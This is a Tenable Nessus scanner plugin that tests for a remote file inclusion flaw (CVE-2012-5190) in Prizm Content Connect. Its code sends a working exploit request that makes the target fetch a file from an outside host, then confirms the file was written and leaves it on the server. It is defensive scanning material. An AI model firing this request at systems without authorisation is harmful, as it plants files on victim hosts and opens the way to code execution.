#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(64684);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2015/09/24 23:21:19 $");

  script_cve_id("CVE-2012-5190");
  script_bugtraq_id(57242);
  script_osvdb_id(89114);

  script_name(english:"Prizm Content Connect default.aspx document Parameter Remote File Inclusion");
  script_summary(english:"Attempts to read a remote file");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts an aspx script that is prone to a remote
file inclusion attack.");
  script_set_attribute(attribute:"description", value:
"The remote web server hosts Prizm Content Connect, a fully customizable
document viewer. 

The 'default.aspx' script included with the install fails to sanitize
user input to the 'document' parameter before reading a file.  A remote
attacker can leverage this issue to view arbitrary files or execute
arbitrary PHP code, possibly taken from third-party hosts, on the remote
host.");
  #http://packetstormsecurity.com/files/119456/Prizm-Content-Connect-Code-Execution.html 
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?078ce7b4");
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/01/09");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/02/19");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:accusoft:prizm_content_connect");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80);

appname = "Prizm Content Connect";
base_url = "/Default.aspx";
rfi_url = base_url + "?document=http://rfi.nessus.org/rfi.txt";
res = http_send_recv3(method:"GET", item:rfi_url, port:port, exit_on_fail:TRUE);
if (
  "<title>AJAX Document Viewer Professional Edition</title>" >< res[2] &&
  'href="http://www.accusoft.com/prizmfaq.htm' >< res[2] &&
  match = eregmatch(pattern:"<b>Full Document Path:</b>\s+(.*\.txt)", string:res[2])
)
{
   path = match[1];
   file = split(match[1], sep:"\");
   file = file[2];
}
else audit(AUDIT_WEB_APP_NOT_INST, appname, port); 

url = "/" + file;
res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);
if (
  "TmVzc3VzQ29kZUV4ZWNUZXN0" >< res[2] &&
  "NessusFileIncludeTest" >< res[2]
)
{
  if (report_verbosity > 0)
  {
    snip =  crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
    report =
      '\nNessus was able to verify the issue exists using the following requests :' +
      '\n' +
      '\n  ' + build_url(qs:rfi_url, port: port) +
      '\n  ' + build_url(qs:url, port: port) + '\n' +
      '\nNote: This file has not been removed by Nessus and will need to be' +
      '\nmanually deleted (' + path + ').' +
      '\n';
    if(report_verbosity > 1) 
    {
      report +=
        '\n' + 'This produced the following output :' +
        '\n' +
        '\n' + snip +
        '\n' + chomp(res) +
        '\n' + snip +
        '\n';
    } 
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, build_url(qs:base_url, port:port));
